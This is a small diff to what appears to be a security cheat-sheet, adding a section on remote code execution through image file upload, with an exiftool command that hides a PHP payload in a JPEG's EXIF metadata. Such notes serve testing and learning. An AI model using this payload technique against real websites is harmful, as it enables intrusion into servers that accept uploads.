@@ -4,6 +4,11 @@
 - https://www.virustotal.com/gui/
 - https://packettotal.com/
 
+### Rce via Image (jpg,png) File Upload..!
+`
+exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" Exif.jpg
+`
+
 ### sort unique
 gc infile.txt | sort | get-unique > outfile.txt
 
